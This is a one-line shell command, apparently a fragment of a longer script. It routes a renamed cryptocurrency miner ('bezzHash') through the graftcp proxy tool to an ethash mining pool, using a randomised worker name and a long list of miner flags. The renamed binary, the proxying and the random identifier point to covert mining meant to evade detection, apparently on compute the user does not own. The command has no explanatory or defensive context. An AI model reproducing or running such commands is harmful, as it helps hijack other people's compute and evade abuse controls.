...
./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.poolbinance.com:1800 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
